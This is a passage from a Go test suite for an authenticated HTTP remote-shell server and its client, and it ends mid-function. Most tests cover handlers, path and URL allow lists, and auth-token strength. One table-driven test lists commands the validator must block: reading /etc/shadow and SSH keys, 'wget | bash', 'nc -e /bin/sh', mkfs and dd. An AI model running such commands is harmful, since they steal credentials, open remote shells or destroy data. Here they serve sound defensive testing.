func TestHandleExec_HistoryCapAt1000(t *testing.T) {
	s := newTestServer(t)

	// Pre-fill history to exactly 1000 entries.
	for i := range 1000 {
		s.CmdHistory = append(s.CmdHistory, CommandResponse{Command: fmt.Sprintf("cmd-%d", i)})
	}

	body := `{"command":"echo overflow"}`
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleExec(rec, req)

	s.Mu.Lock()
	count := len(s.CmdHistory)
	s.Mu.Unlock()

	if count != 1000 {
		t.Errorf("CmdHistory length = %d, want 1000 after capping", count)
	}
}

func TestHandleCD_MalformedJSON(t *testing.T) {
	s := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/cd", strings.NewReader("{bad json"))
	rec := httptest.NewRecorder()

	s.HandleCD(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Errorf("HandleCD malformed JSON status = %d, want %d", rec.Code, http.StatusBadRequest)
	}

	var apiErr APIError
	if err := json.NewDecoder(rec.Body).Decode(&apiErr); err != nil {
		t.Fatalf("HandleCD error response is not valid JSON: %v", err)
	}

	if apiErr.Code != "INVALID_REQUEST" {
		t.Errorf("HandleCD error code = %q, want %q", apiErr.Code, "INVALID_REQUEST")
	}
}

// TestHandleCD_ForbiddenPath moved to httpshell_{unix,windows}_test.go

// TestHandleCD_NotADirectory moved to httpshell_unix_test.go

func TestHandleCD_RelativePath(t *testing.T) {
	s := newTestServer(t)

	// Create a subdirectory inside the server's WorkDir so the relative cd succeeds.
	subDir := filepath.Join(s.WorkDir, "subdir")
	if err := os.Mkdir(subDir, 0o755); err != nil {
		t.Fatalf("TestHandleCD_RelativePath: failed to create subdir: %v", err)
	}

	body := `{"path":"subdir"}`
	req := httptest.NewRequest(http.MethodPost, "/cd", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleCD(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("HandleCD relative path status = %d, want %d", rec.Code, http.StatusOK)
	}

	var result map[string]string
	if err := json.NewDecoder(rec.Body).Decode(&result); err != nil {
		t.Fatalf("HandleCD response is not valid JSON: %v", err)
	}

	if result["workdir"] != subDir {
		t.Errorf("HandleCD workdir = %q, want %q", result["workdir"], subDir)
	}
}

// TestExecuteCommand_NonZeroExitCode moved to httpshell_{unix,windows}_test.go

// TestExecuteCommand_WithStderr moved to httpshell_unix_test.go

// TestExecuteCommand_CustomShell moved to httpshell_unix_test.go

// TestExecuteCommand_Timeout moved to httpshell_unix_test.go

// TestExecuteCommand_WithWorkDir moved to httpshell_unix_test.go

func TestGetLocalAllowedIP(t *testing.T) {
	// Simply verify the function does not panic; it may or may not find an IP.
	_ = GetLocalAllowedIP()
}

func TestIsCommandAllowed_ForbiddenPathPatterns(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{name: "path with space prefix", command: "cat /etc/shadow", want: false},
		{name: "path with quote prefix", command: `cat "/etc/passwd"`, want: false},
		{name: "path with equals prefix", command: "env FILE=/etc/shadow", want: false},
		{name: "ssh key", command: "cat id_rsa", want: false},
		{name: "env file", command: "cat app.env", want: false},
		{name: "safe path", command: "ls /home/user", want: true},
		{name: "wget pipe bash", command: "wget | bash", want: false},
		{name: "nc exec", command: "nc -e /bin/sh", want: false},
		{name: "perl exec", command: "perl -e 'system(ls)'", want: false},
		{name: "ruby exec", command: "ruby -e 'puts 1'", want: false},
		{name: "mkfs", command: "mkfs /dev/sda", want: false},
		{name: "dd if", command: "dd if=/dev/zero of=/dev/null", want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, reason := IsCommandAllowed(tt.command)
			if got != tt.want {
				t.Errorf("IsCommandAllowed(%q) = %v (%s), want %v", tt.command, got, reason, tt.want)
			}
		})
	}
}

func TestIsAllowedPath_EdgeCases(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool
	}{
		{name: "home root", path: "/home", want: true},
		{name: "c users root", path: "c:/users", want: true},
		{name: "b drive root", path: "b:", want: true},
		{name: "c root blocked", path: "c:/", want: false},
		{name: "c programdata blocked", path: "c:/programdata/app", want: false},
		{name: "c system blocked", path: "c:/system/drivers", want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsAllowedPath(tt.path)
			if got != tt.want {
				t.Errorf("IsAllowedPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

func TestIsAllowedURL_EdgeCases(t *testing.T) {
	tests := []struct {
		name string
		url  string
		want bool
	}{
		// IPv6 loopback in URL form is not handled by IsAllowedURL (it splits on ":").
		// Test the bare ::1 form which IsAllowedIP handles but IsAllowedURL does not reach.
		{name: "ipv6 loopback bare", url: "::1", want: false},
		{name: "allowed range end", url: "https://192.168.15.109:443", want: true},
		{name: "just outside range", url: "https://192.168.15.110:443", want: false},
		{name: "no scheme", url: "192.168.15.101:8080", want: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsAllowedURL(tt.url)
			if got != tt.want {
				t.Errorf("IsAllowedURL(%q) = %v, want %v", tt.url, got, tt.want)
			}
		})
	}
}

// TestDetectShell_DefaultBranch exercises the default (unknown GOOS) code path
// by constructing a server and overriding Shell/ShellArgs after a DetectShell
// call. On Linux we can only directly test the Linux branch; but we cover
// the "no shell found" fallback by temporarily renaming the target shells.
func TestDetectShell_DefaultBranch(t *testing.T) {
	// The default branch sets Shell = "sh" / ShellArgs = ["-c"].
	// We cannot change runtime.GOOS, but we can verify that DetectShell always
	// ends with a non-empty Shell and ShellArgs regardless of which branch ran.
	s := &Server{}
	s.DetectShell()

	if s.Shell == "" {
		t.Error("DetectShell() produced empty Shell")
	}

	if len(s.ShellArgs) == 0 {
		t.Error("DetectShell() produced empty ShellArgs")
	}
}

// TestDetectShell_FallbackShell verifies that DetectShell falls back to /bin/sh
// TestDetectShell_ShellsExist moved to httpshell_{unix,windows}_test.go

// TestGenerateSelfSignedCert_BadCertPath verifies that GenerateSelfSignedCert
// returns an error when the certificate path is not writable.
func TestGenerateSelfSignedCert_BadCertPath(t *testing.T) {
	err := GenerateSelfSignedCert("/nonexistent-dir/cert.pem", "/nonexistent-dir/key.pem")
	if err == nil {
		t.Fatal("GenerateSelfSignedCert() expected error for unwritable cert path, got nil")
	}
}

// TestGenerateSelfSignedCert_BadKeyPath verifies that GenerateSelfSignedCert
// returns an error when the key path is not writable.
func TestGenerateSelfSignedCert_BadKeyPath(t *testing.T) {
	dir := t.TempDir()
	certPath := filepath.Join(dir, "cert.pem")
	// Use a bad key path (directory that doesn't exist).
	err := GenerateSelfSignedCert(certPath, "/nonexistent-dir/key.pem")
	if err == nil {
		t.Fatal("GenerateSelfSignedCert() expected error for unwritable key path, got nil")
	}
}

// TestDoRequest_BadURL verifies that DoRequest returns an error when the server
// URL produces an invalid HTTP request (e.g., scheme-less garbage URL).
func TestDoRequest_BadURL(t *testing.T) {
	client := &Client{
		ServerURL:  "://bad-url",
		AuthID:     "ABC123",
		HTTPClient: http.DefaultClient,
	}

	_, err := client.DoRequest("GET", "/", nil)
	if err == nil {
		t.Fatal("DoRequest() expected error for malformed URL, got nil")
	}
}

// TestClient_GetServerInfo_BadJSON verifies that GetServerInfo returns an error
// when the server responds with 200 OK but the body is not valid JSON.
func TestClient_GetServerInfo_BadJSON(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte("not json at all"))
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.GetServerInfo()
	if err == nil {
		t.Fatal("GetServerInfo() expected JSON decode error for invalid body, got nil")
	}
}

// TestClient_ExecuteCommand_BadJSON verifies that ExecuteCommand returns an
// error when the server responds with 200 OK but the body is not valid JSON.
func TestClient_ExecuteCommand_BadJSON(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte("not json"))
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.ExecuteCommand("echo hello", "")
	if err == nil {
		t.Fatal("ExecuteCommand() expected JSON decode error for invalid body, got nil")
	}
}

// TestClient_ChangeDir_BadJSON verifies that ChangeDir returns an error when
// the server responds with 200 OK but the body is not valid JSON.
func TestClient_ChangeDir_BadJSON(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte("not json"))
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.ChangeDir("/home/user/newdir")
	if err == nil {
		t.Fatal("ChangeDir() expected JSON decode error for invalid body, got nil")
	}
}

// TestIsAllowedPath_CUsersOverridesBlockedC verifies that c:/users paths are
// allowed even though c:/ is in the blocked list (the continue path in IsAllowedPath).
func TestIsAllowedPath_CUsersOverridesBlockedC(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool
	}{
		{name: "c users override", path: "c:/users/alice/desktop", want: true},
		{name: "c users root override", path: "c:/users", want: true},
		{name: "c program files blocked", path: "c:/program files/app", want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsAllowedPath(tt.path)
			if got != tt.want {
				t.Errorf("IsAllowedPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

// TestExecuteCommand_ServerShellAlwaysUsed verifies that ExecuteCommand always
// uses the server-detected shell, not any caller-supplied value. The Shell field
// has been removed from CommandRequest as a security hardening measure — this test
// confirms that the command runs successfully using only the server's own shell.
func TestExecuteCommand_ServerShellAlwaysUsed(t *testing.T) {
	s := newTestServer(t)

	// Run a basic command — it must succeed with the server's own shell.
	resp := s.ExecuteCommand(CommandRequest{Command: "echo hello"})

	if resp.Error != "" && resp.ExitCode != 0 {
		t.Logf("ExecuteCommand error (may be expected on some CI): %v", resp.Error)
	}
	// The function must not panic.
	_ = resp
}

// TestExecuteCommand_WithStderrNoNewline moved to httpshell_unix_test.go

// TestClient_GetServerInfo_NetworkError verifies that GetServerInfo propagates a
// network-level error when the server is unreachable.
func TestClient_GetServerInfo_NetworkError(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
	url := mockServer.URL
	mockServer.Close() // close before request so Do() fails

	client := &Client{
		ServerURL:  url,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.GetServerInfo()
	if err == nil {
		t.Fatal("GetServerInfo() expected network error for closed server, got nil")
	}
}

// TestClient_ExecuteCommand_NetworkError verifies that ExecuteCommand propagates
// a network-level error when the server is unreachable.
func TestClient_ExecuteCommand_NetworkError(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
	url := mockServer.URL
	mockServer.Close()

	client := &Client{
		ServerURL:  url,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.ExecuteCommand("echo hello", "")
	if err == nil {
		t.Fatal("ExecuteCommand() expected network error for closed server, got nil")
	}
}

// TestClient_ChangeDir_NetworkError verifies that ChangeDir propagates a
// network-level error when the server is unreachable.
func TestClient_ChangeDir_NetworkError(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
	url := mockServer.URL
	mockServer.Close()

	client := &Client{
		ServerURL:  url,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.ChangeDir("/home/user/newdir")
	if err == nil {
		t.Fatal("ChangeDir() expected network error for closed server, got nil")
	}
}

// TestClient_DoRequest_SetsHeaders verifies that DoRequest sets auth and content-type headers.
func TestClient_DoRequest_SetsHeaders(t *testing.T) {
	var gotAuthID, gotContentType string

	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuthID = r.Header.Get("X-Auth-ID")
		gotContentType = r.Header.Get("Content-Type")
		w.WriteHeader(http.StatusOK)
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "TEST99",
		HTTPClient: mockServer.Client(),
	}

	resp, err := client.DoRequest("GET", "/test", nil)
	if err != nil {
		t.Fatalf("DoRequest() error: %v", err)
	}
	_ = resp.Body.Close()

	if gotAuthID != "TEST99" {
		t.Errorf("DoRequest X-Auth-ID = %q, want %q", gotAuthID, "TEST99")
	}

	if gotContentType != "application/json" {
		t.Errorf("DoRequest Content-Type = %q, want %q", gotContentType, "application/json")
	}
}

// TestHandleExec_ForbiddenWorkDir_Windows tests forbidden workdir on Windows paths.
func TestHandleExec_ForbiddenWorkDir_Windows(t *testing.T) {
	s := newTestServer(t)

	body := `{"command":"dir","workdir":"C:\\Windows\\System32"}`
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleExec(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Errorf("HandleExec forbidden workdir status = %d, want %d", rec.Code, http.StatusForbidden)
	}
}

// TestHandleHistory_Empty verifies HandleHistory returns an empty list (null/[]) when no commands run.
func TestHandleHistory_Empty(t *testing.T) {
	s := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/history", nil)
	rec := httptest.NewRecorder()
	s.HandleHistory(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("HandleHistory empty status = %d, want %d", rec.Code, http.StatusOK)
	}

	ct := rec.Header().Get("Content-Type")
	if ct != "application/json" {
		t.Errorf("HandleHistory Content-Type = %q, want %q", ct, "application/json")
	}
}

// TestHandleInfo_VersionAndPlatform checks that ServerInfo fields match expected values.
func TestHandleInfo_VersionAndPlatform(t *testing.T) {
	s := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	rec := httptest.NewRecorder()
	s.HandleInfo(rec, req)

	var info ServerInfo
	if err := json.NewDecoder(rec.Body).Decode(&info); err != nil {
		t.Fatalf("HandleInfo JSON decode error: %v", err)
	}

	if info.Version != Version {
		t.Errorf("HandleInfo version = %q, want %q", info.Version, Version)
	}

	if info.Platform != runtime.GOOS {
		t.Errorf("HandleInfo platform = %q, want %q", info.Platform, runtime.GOOS)
	}

	if info.Arch != runtime.GOARCH {
		t.Errorf("HandleInfo arch = %q, want %q", info.Arch, runtime.GOARCH)
	}
}

// TestWithMiddleware_CaseInsensitiveAuth verifies middleware normalizes auth ID case.
func TestWithMiddleware_CaseInsensitiveAuth(t *testing.T) {
	s := newTestServer(t)

	called := false
	handler := s.WithMiddleware(func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "127.0.0.1:1234"
	req.Header.Set("X-Auth-ID", "abc123") // lowercase version of ABC123
	rec := httptest.NewRecorder()

	handler(rec, req)

	if !called {
		t.Error("WithMiddleware did not call next handler for case-insensitive auth match")
	}
}

// TestWithMiddleware_DashedAuth verifies middleware strips dashes from auth ID.
func TestWithMiddleware_DashedAuth(t *testing.T) {
	s := newTestServer(t)

	called := false
	handler := s.WithMiddleware(func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "127.0.0.1:1234"
	req.Header.Set("X-Auth-ID", "AB-C1-23")
	rec := httptest.NewRecorder()

	handler(rec, req)

	if !called {
		t.Error("WithMiddleware did not call next handler for dashed auth ID")
	}
}

// TestIsAllowedPath_Backslashes verifies that backslash paths are normalized.
func TestIsAllowedPath_Backslashes(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool
	}{
		{name: "backslash c users", path: `C:\Users\test\docs`, want: true},
		{name: "backslash c windows", path: `C:\Windows\System32`, want: false},
		{name: "backslash b drive", path: `B:\data\files`, want: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsAllowedPath(tt.path)
			if got != tt.want {
				t.Errorf("IsAllowedPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

// TestIsCommandAllowed_BackslashNormalization verifies command check normalizes backslashes.
func TestIsCommandAllowed_BackslashNormalization(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{name: "backslash etc", command: `type C:\etc\passwd`, want: false},
		{name: "backslash .ssh", command: `dir C:\Users\test\.ssh`, want: false},
		{name: "safe command", command: "dir C:\\Users\\test\\docs", want: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, _ := IsCommandAllowed(tt.command)
			if got != tt.want {
				t.Errorf("IsCommandAllowed(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// TestIsAllowedPath_DPath verifies that D: drive is not in allowed list.
func TestIsAllowedPath_DPath(t *testing.T) {
	got := IsAllowedPath("D:/data")
	if got {
		t.Error("IsAllowedPath(D:/data) = true, want false (D: not in allowed list)")
	}
}

// TestIsAllowedURL_NoScheme verifies URL checking without http/https prefix.
func TestIsAllowedURL_NoScheme(t *testing.T) {
	tests := []struct {
		name string
		url  string
		want bool
	}{
		{name: "bare localhost", url: "localhost:8080", want: true},
		{name: "bare 127.0.0.1", url: "127.0.0.1:8080", want: true},
		{name: "bare allowed IP", url: "192.168.15.103:443", want: true},
		{name: "bare disallowed", url: "10.0.0.1:8080", want: false},
		{name: "bare localhost no port", url: "localhost", want: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsAllowedURL(tt.url)
			if got != tt.want {
				t.Errorf("IsAllowedURL(%q) = %v, want %v", tt.url, got, tt.want)
			}
		})
	}
}

// TestWriteError_EmptyDetails verifies WriteError with no details.
func TestWriteError_EmptyDetails(t *testing.T) {
	s := newTestServer(t)

	rec := httptest.NewRecorder()
	s.WriteError(rec, http.StatusNotFound, "NOT_FOUND", "resource not found", "")

	var apiErr APIError
	if err := json.NewDecoder(rec.Body).Decode(&apiErr); err != nil {
		t.Fatalf("WriteError decode error: %v", err)
	}

	if apiErr.Details != "" {
		t.Errorf("WriteError details = %q, want empty", apiErr.Details)
	}
}

// TestRunInteractive_ExitCommand verifies RunInteractive handles "exit" input.
func TestRunInteractive_ExitCommand(t *testing.T) {
	// Set up a mock server that returns info on / and command results on /exec.
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		switch r.URL.Path {
		case "/":
			_ = json.NewEncoder(w).Encode(ServerInfo{
				Version: Version, Platform: "test", Arch: "amd64",
				Hostname: "testhost", Shell: "/bin/sh",
				WorkDir: "/home/user", Uptime: "1s",
			})
		case "/exec":
			_ = json.NewEncoder(w).Encode(CommandResponse{
				Command: "echo hi", Output: "hi\n", ExitCode: 0,
				Duration: "1ms", Timestamp: "2026-01-01T00:00:00Z",
				WorkDir: "/home/user",
			})
		case "/cd":
			_ = json.NewEncoder(w).Encode(map[string]string{"workdir": "/home/user/newdir"})
		}
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	// Replace stdin with a reader that sends commands then "exit".
	oldStdin := os.Stdin
	r, w, _ := os.Pipe()
	os.Stdin = r

	go func() {
		_, _ = fmt.Fprintln(w, "echo hi")
		_, _ = fmt.Fprintln(w, "")        // empty line (skipped)
		_, _ = fmt.Fprintln(w, "cd docs") // test cd path
		_, _ = fmt.Fprintln(w, "exit")
		_ = w.Close()
	}()

	err := client.RunInteractive()
	os.Stdin = oldStdin

	if err != nil {
		t.Errorf("RunInteractive() error: %v", err)
	}
}

// TestRunInteractive_QuitCommand verifies RunInteractive handles "quit" input.
func TestRunInteractive_QuitCommand(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(ServerInfo{
			Version: Version, Platform: "test", Arch: "amd64",
			Hostname: "testhost", Shell: "/bin/sh",
			WorkDir: "/home/user", Uptime: "1s",
		})
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	oldStdin := os.Stdin
	r, w, _ := os.Pipe()
	os.Stdin = r

	go func() {
		_, _ = fmt.Fprintln(w, "quit")
		_ = w.Close()
	}()

	err := client.RunInteractive()
	os.Stdin = oldStdin

	if err != nil {
		t.Errorf("RunInteractive() error: %v", err)
	}
}

// TestRunInteractive_EOF verifies RunInteractive handles EOF (pipe close) gracefully.
func TestRunInteractive_EOF(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(ServerInfo{
			Version: Version, Platform: "test", Arch: "amd64",
			Hostname: "testhost", Shell: "/bin/sh",
			WorkDir: "/home/user", Uptime: "1s",
		})
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	oldStdin := os.Stdin
	r, w, _ := os.Pipe()
	os.Stdin = r
	_ = w.Close() // immediate EOF

	err := client.RunInteractive()
	os.Stdin = oldStdin

	if err != nil {
		t.Errorf("RunInteractive() error: %v", err)
	}
}

// TestRunInteractive_ConnectionError verifies RunInteractive returns error when server is down.
func TestRunInteractive_ConnectionError(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
	url := mockServer.URL
	mockServer.Close()

	client := &Client{
		ServerURL:  url,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	err := client.RunInteractive()
	if err == nil {
		t.Error("RunInteractive() expected error for unreachable server, got nil")
	}
}

// TestRunInteractive_CommandError verifies RunInteractive handles command execution errors.
func TestRunInteractive_CommandError(t *testing.T) {
	callCount := 0
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if r.URL.Path == "/" {
			_ = json.NewEncoder(w).Encode(ServerInfo{
				Version: Version, Platform: "test", Arch: "amd64",
				Hostname: "testhost", Shell: "/bin/sh",
				WorkDir: "/home/user", Uptime: "1s",
			})
			return
		}
		if r.URL.Path == "/exec" {
			callCount++
			_ = json.NewEncoder(w).Encode(CommandResponse{
				Command: "fail", Output: "some output", ExitCode: 1,
				Error: "command failed", Duration: "1ms",
				Timestamp: "2026-01-01T00:00:00Z", WorkDir: "/home/user",
			})
			return
		}
		if r.URL.Path == "/cd" {
			w.WriteHeader(http.StatusNotFound)
			_ = json.NewEncoder(w).Encode(APIError{Code: "DIR_NOT_FOUND", Message: "not found"})
			return
		}
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	oldStdin := os.Stdin
	r, w, _ := os.Pipe()
	os.Stdin = r

	go func() {
		_, _ = fmt.Fprintln(w, "fail")      // triggers non-zero exit code path
		_, _ = fmt.Fprintln(w, "cd baddir") // triggers cd error path
		_, _ = fmt.Fprintln(w, "exit")
		_ = w.Close()
	}()

	err := client.RunInteractive()
	os.Stdin = oldStdin

	if err != nil {
		t.Errorf("RunInteractive() error: %v", err)
	}
}

// TestRunInteractive_LongPromptDir verifies prompt truncation for long working dirs.
func TestRunInteractive_LongPromptDir(t *testing.T) {
	longDir := "/home/user/very/deeply/nested/directory/structure/that/exceeds/forty/characters"
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(ServerInfo{
			Version: Version, Platform: "test", Arch: "amd64",
			Hostname: "testhost", Shell: "/bin/sh",
			WorkDir: longDir, Uptime: "1s",
		})
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	oldStdin := os.Stdin
	r, w, _ := os.Pipe()
	os.Stdin = r

	go func() {
		_, _ = fmt.Fprintln(w, "exit")
		_ = w.Close()
	}()

	err := client.RunInteractive()
	os.Stdin = oldStdin

	if err != nil {
		t.Errorf("RunInteractive() error: %v", err)
	}
}

// TestRunSingleCommand_Success verifies RunSingleCommand with a successful response.
func TestRunSingleCommand_Success(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(CommandResponse{
			Command: "echo hello", Output: "hello\n", ExitCode: 0,
			Duration: "1ms", Timestamp: "2026-01-01T00:00:00Z",
			WorkDir: "/home/user",
		})
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	err := client.RunSingleCommand("echo hello")
	if err != nil {
		t.Errorf("RunSingleCommand() error: %v", err)
	}
}

// TestRunSingleCommand_NetworkError verifies RunSingleCommand propagates network errors.
func TestRunSingleCommand_NetworkError(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
	url := mockServer.URL
	mockServer.Close()

	client := &Client{
		ServerURL:  url,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	err := client.RunSingleCommand("echo hello")
	if err == nil {
		t.Error("RunSingleCommand() expected error for unreachable server, got nil")
	}
}

// TestRunInteractive_CommandOutputNoNewline verifies output without trailing newline.
func TestRunInteractive_CommandOutputNoNewline(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if r.URL.Path == "/" {
			_ = json.NewEncoder(w).Encode(ServerInfo{
				Version: Version, Platform: "test", Arch: "amd64",
				Hostname: "testhost", Shell: "/bin/sh",
				WorkDir: "/home/user", Uptime: "1s",
			})
			return
		}
		// Return output without trailing newline
		_ = json.NewEncoder(w).Encode(CommandResponse{
			Command: "printf hi", Output: "hi", ExitCode: 0,
			Duration: "1ms", Timestamp: "2026-01-01T00:00:00Z",
			WorkDir: "/home/user",
		})
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	oldStdin := os.Stdin
	r, w, _ := os.Pipe()
	os.Stdin = r

	go func() {
		_, _ = fmt.Fprintln(w, "printf hi")
		_, _ = fmt.Fprintln(w, "exit")
		_ = w.Close()
	}()

	err := client.RunInteractive()
	os.Stdin = oldStdin

	if err != nil {
		t.Errorf("RunInteractive() error: %v", err)
	}
}

// TestRunInteractive_ExecNetworkError verifies RunInteractive handles network errors during exec.
func TestRunInteractive_ExecNetworkError(t *testing.T) {
	reqCount := 0
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reqCount++
		w.Header().Set("Content-Type", "application/json")
		if r.URL.Path == "/" && reqCount <= 1 {
			_ = json.NewEncoder(w).Encode(ServerInfo{
				Version: Version, Platform: "test", Arch: "amd64",
				Hostname: "testhost", Shell: "/bin/sh",
				WorkDir: "/home/user", Uptime: "1s",
			})
			return
		}
		// Close connection for exec requests to simulate network error
		hj, ok := w.(http.Hijacker)
		if ok {
			conn, _, _ := hj.Hijack()
			_ = conn.Close()
		}
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	oldStdin := os.Stdin
	r, w, _ := os.Pipe()
	os.Stdin = r

	go func() {
		_, _ = fmt.Fprintln(w, "echo test")
		_, _ = fmt.Fprintln(w, "exit")
		_ = w.Close()
	}()

	err := client.RunInteractive()
	os.Stdin = oldStdin

	if err != nil {
		t.Errorf("RunInteractive() error: %v", err)
	}
}

// TestGenerateAuthID_Uniqueness verifies that multiple calls produce unique IDs.
func TestGenerateAuthID_Uniqueness(t *testing.T) {
	const wantLen = 32
	seen := make(map[string]bool)

	for range 20 {
		id := GenerateAuthID()
		if len(id) != wantLen {
			t.Errorf("GenerateAuthID() length = %d, want %d", len(id), wantLen)
		}

		seen[id] = true
	}

	// With a 57-char alphabet and 32 positions, collisions in 20 draws are
	// astronomically unlikely; any collision indicates a broken RNG.
	if len(seen) < 20 {
		t.Errorf("GenerateAuthID() produced too few unique IDs: %d out of 20", len(seen))
	}
}

// ---------------------------------------------------------------------------
// Security hardening tests (W6 — httpshell lockdown)
// ---------------------------------------------------------------------------

// TestGenerateAuthID_MinLength verifies the token meets the >=32 char minimum
// required to resist brute-force attacks on a local socket (the old 6-char
// token had ~30 bits of entropy; 32 chars from a 57-symbol alphabet gives
// ~189 bits).
func TestGenerateAuthID_MinLength(t *testing.T) {
	const minLen = 32

	for range 50 {
		id := GenerateAuthID()
		if len(id) < minLen {
			t.Errorf("GenerateAuthID() length = %d, want >= %d", len(id), minLen)
		}
	}
}

// TestGenerateAuthID_Entropy verifies that 100 generated tokens are all
// distinct, confirming that crypto/rand (not a time-seeded fallback) is used.
func TestGenerateAuthID_Entropy(t *testing.T) {
	seen := make(map[string]struct{}, 100)

